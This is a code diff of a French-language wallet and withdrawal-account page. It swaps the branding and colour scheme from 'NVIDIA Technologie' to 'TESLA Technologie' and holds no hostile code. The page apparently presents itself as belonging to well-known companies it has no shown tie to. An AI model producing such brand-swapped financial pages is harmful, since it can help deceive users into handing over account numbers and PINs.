@@ -116,16 +116,16 @@ $methodes_noms = [
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portefeuille - NVIDIA Technologie</title>
+    <title>Portefeuille - TESLA Technologie</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
     :root {
-        /* Couleurs NVIDIA */
+        /* Couleurs TESLA */
         --primary-white: #ffffff;
         --soft-white: #f8fafc;
         --light-gray: #f1f5f9;
-        --accent-green: #76B900; /* Vert NVIDIA */
-        --green-light: #90d300;
+        --accent-green: #E82127; /* Rouge TESLA */
+        --green-light: #ff4444;
         --green-dark: #5a8a00;
         --accent-cyan: #00CC7C; /* Cyan secondaire */
         --text-dark: #1e293b;
@@ -171,9 +171,9 @@ $methodes_noms = [
         width: 100%;
         height: 100%;
         background: 
-            radial-gradient(circle at 10% 20%, rgba(118, 185, 0, 0.15) 0%, transparent 20%),
+            radial-gradient(circle at 10% 20%, rgba(232, 33, 39, 0.15) 0%, transparent 20%),
             radial-gradient(circle at 90% 80%, rgba(0, 204, 124, 0.15) 0%, transparent 20%),
-            radial-gradient(circle at 20% 30%, rgba(118, 185, 0, 0.1) 0%, transparent 50%),
+            radial-gradient(circle at 20% 30%, rgba(232, 33, 39, 0.1) 0%, transparent 50%),
             radial-gradient(circle at 80% 70%, rgba(0, 204, 124, 0.1) 0%, transparent 50%),
             linear-gradient(135deg, var(--dark-bg) 0%, #2c2c2c 100%);
         z-index: -3;
@@ -186,11 +186,11 @@ $methodes_noms = [
         width: 100%;
         height: 100%;
         background-image: 
-            linear-gradient(30deg, rgba(118, 185, 0, 0.08) 12%, transparent 12.5%, transparent 87%, rgba(118, 185, 0, 0.08) 87.5%, rgba(118, 185, 0, 0.08) 0),
+            linear-gradient(30deg, rgba(232, 33, 39, 0.08) 12%, transparent 12.5%, transparent 87%, rgba(232, 33, 39, 0.08) 87.5%, rgba(232, 33, 39, 0.08) 0),
             linear-gradient(150deg, rgba(0, 204, 124, 0.08) 12%, transparent 12.5%, transparent 87%, rgba(0, 204, 124, 0.08) 87.5%, rgba(0, 204, 124, 0.08) 0),
-            linear-gradient(30deg, rgba(118, 185, 0, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(118, 185, 0, 0.05) 87.5%, rgba(118, 185, 0, 0.05) 0),
+            linear-gradient(30deg, rgba(232, 33, 39, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(232, 33, 39, 0.05) 87.5%, rgba(232, 33, 39, 0.05) 0),
             linear-gradient(150deg, rgba(0, 204, 124, 0.05) 12%, transparent 12.5%, transparent 87%, rgba(0, 204, 124, 0.05) 87.5%, rgba(0, 204, 124, 0.05) 0),
-            linear-gradient(60deg, rgba(118, 185, 0, 0.1) 25%, transparent 25.5%, transparent 75%, rgba(118, 185, 0, 0.1) 75%, rgba(118, 185, 0, 0.1) 0),
+            linear-gradient(60deg, rgba(232, 33, 39, 0.1) 25%, transparent 25.5%, transparent 75%, rgba(232, 33, 39, 0.1) 75%, rgba(232, 33, 39, 0.1) 0),
             linear-gradient(60deg, rgba(0, 204, 124, 0.1) 25%, transparent 25.5%, transparent 75%, rgba(0, 204, 124, 0.1) 75%, rgba(0, 204, 124, 0.1) 0);
         background-size: 100px 175px;
         background-position: 0 0, 0 0, 50px 87.5px, 50px 87.5px, 0 0, 50px 87.5px;
@@ -204,7 +204,7 @@ $methodes_noms = [
         right: 0;
         width: 400px;
         height: 400px;
-        background: radial-gradient(circle, rgba(118, 185, 0, 0.25) 0%, transparent 70%);
+        background: radial-gradient(circle, rgba(232, 33, 39, 0.25) 0%, transparent 70%);
         filter: blur(60px);
         z-index: -1;
     }
@@ -300,7 +300,7 @@ $methodes_noms = [
         color: var(--dark-bg); /* Texte foncé sur fond clair */
         font-weight: bold;
         font-size: 18px;
-        box-shadow: 0 8px 25px rgba(118, 185, 0, 0.5);
+        box-shadow: 0 8px 25px rgba(232, 33, 39, 0.5);
         transition: all 0.3s ease;
         position: relative;
         overflow: hidden;
@@ -375,7 +375,7 @@ $methodes_noms = [
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2); /* Bordure accentuée */
+        border: 1px solid rgba(232, 33, 39, 0.2); /* Bordure accentuée */
         margin-bottom: 20px;
         transition: var(--transition);
         color: var(--dark-text);
@@ -389,7 +389,7 @@ $methodes_noms = [
     .info-card h2 {
         font-size: 18px;
         font-weight: 700;
-        color: var(--accent-green); /* Couleur NVIDIA */
+        color: var(--accent-green); /* Couleur TESLA */
         margin-bottom: 15px;
         display: flex;
         align-items: center;
@@ -408,7 +408,7 @@ $methodes_noms = [
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         margin-bottom: 20px;
         animation: fadeInUp 1.2s ease-out;
         color: var(--dark-text);
@@ -429,7 +429,7 @@ $methodes_noms = [
     .form-input {
         width: 100%;
         padding: 15px;
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         border-radius: 10px;
         font-size: 15px;
         transition: var(--transition);
@@ -440,13 +440,13 @@ $methodes_noms = [
     .form-input:focus {
         outline: none;
         border-color: var(--accent-green);
-        box-shadow: 0 0 0 2px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 0 0 2px rgba(232, 33, 39, 0.4);
     }
     
     .form-select {
         width: 100%;
         padding: 15px;
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         border-radius: 10px;
         font-size: 15px;
         transition: var(--transition);
@@ -464,7 +464,7 @@ $methodes_noms = [
     .form-select:focus {
         outline: none;
         border-color: var(--accent-green);
-        box-shadow: 0 0 0 2px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 0 0 2px rgba(232, 33, 39, 0.4);
     }
     
     .pin-inputs {
@@ -482,7 +482,7 @@ $methodes_noms = [
         font-weight: 700;
         background: #333;
         color: var(--primary-white);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         border-radius: 10px;
         transition: var(--transition);
     }
@@ -490,11 +490,11 @@ $methodes_noms = [
     .pin-input:focus {
         outline: none;
         border-color: var(--accent-green);
-        box-shadow: 0 0 0 2px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 0 0 2px rgba(232, 33, 39, 0.4);
     }
     
     .submit-btn {
-        /* Dégradé Vert/Cyan NVIDIA */
+        /* Dégradé Vert/Cyan TESLA */
         background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
         color: var(--dark-bg); /* Texte très foncé sur bouton clair */
         border: none;
@@ -506,12 +506,12 @@ $methodes_noms = [
         transition: var(--transition);
         width: 100%;
         margin-top: 10px;
-        box-shadow: 0 4px 12px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 4px 12px rgba(232, 33, 39, 0.4);
     }
     
     .submit-btn:hover {
         transform: translateY(-2px);
-        box-shadow: 0 6px 15px rgba(118, 185, 0, 0.6);
+        box-shadow: 0 6px 15px rgba(232, 33, 39, 0.6);
     }
     
     .submit-btn:disabled {
@@ -527,7 +527,7 @@ $methodes_noms = [
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         margin-bottom: 20px;
         animation: fadeInUp 1.2s ease-out;
         color: var(--dark-text);
@@ -538,7 +538,7 @@ $methodes_noms = [
         justify-content: space-between;
         align-items: center;
         padding: 12px 0;
-        border-bottom: 1px solid rgba(118, 185, 0, 0.1);
+        border-bottom: 1px solid rgba(232, 33, 39, 0.1);
     }
     
     .wallet-item:last-child {
@@ -568,12 +568,12 @@ $methodes_noms = [
         cursor: pointer;
         transition: var(--transition);
         margin-top: 15px;
-        box-shadow: 0 4px 12px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 4px 12px rgba(232, 33, 39, 0.3);
     }
     
     .edit-btn:hover {
         transform: translateY(-2px);
-        box-shadow: 0 6px 15px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 6px 15px rgba(232, 33, 39, 0.4);
     }
     
     /* Messages d'alerte */
@@ -762,7 +762,7 @@ $methodes_noms = [
         <div class="header">
             <div class="header-logo">
                 <div class="logo-icon">NV</div> <div>
-                    <div class="logo-text">NVIDIA</div>
+                    <div class="logo-text">TESLA</div>
                     <div class="logo-subtext">Technologie</div>
                 </div>
             </div>
@@ -774,7 +774,7 @@ $methodes_noms = [
             
             <div class="header-content">
                 <h1>Mon Portefeuille</h1>
-                <p>Gérez votre compte de retrait NVIDIA Technologie</p>
+                <p>Gérez votre compte de retrait TESLA Technologie</p>
             </div>
         </div>
         
@@ -799,11 +799,11 @@ $methodes_noms = [
                     Information importante
                 </h2>
                 <p>
-                    Cette page vous permet d'enregistrer votre portefeuille de retrait **NVIDIA Technologie**. 
+                    Cette page vous permet d'enregistrer votre portefeuille de retrait **TESLA Technologie**. 
                     C'est le compte sur lequel vous allez recevoir vos retraits.
                 </p>
                 <p style="margin-top: 10px; font-size: 13px; color: var(--error);">
-                    <strong>Attention :</strong> En cas d'erreur dans le numéro, NVIDIA Technologie ne peut pas être tenu responsable.
+                    <strong>Attention :</strong> En cas d'erreur dans le numéro, TESLA Technologie ne peut pas être tenu responsable.
                 </p>
             </div>
             
